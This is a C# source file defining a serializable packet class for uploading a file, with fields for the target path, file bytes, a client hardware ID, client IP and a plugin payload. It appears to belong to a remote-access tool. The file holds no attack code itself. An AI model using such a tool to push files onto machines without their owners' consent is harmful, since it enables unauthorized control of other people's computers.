using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class UploadFilePacket : IPacket
    {
        //server
        public UploadFilePacket(string path, byte[] file) : base()
        {
            this.packetType = PacketType.FM_UPLOAD_FILE;
            this.path = path;
            this.file = file;
        }

        //client
        public UploadFilePacket(string fileName, bool uploaded, string baseIp, string HWID) : base()
        {
            this.packetType = PacketType.FM_UPLOAD_FILE;
            this.baseIp = baseIp;
            this.HWID = HWID;
            this.path = fileName;
            this.uploaded = uploaded;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public string path { get; set; }
        public bool uploaded { get; set; }
        public byte[] file { get; set; }
    }
}
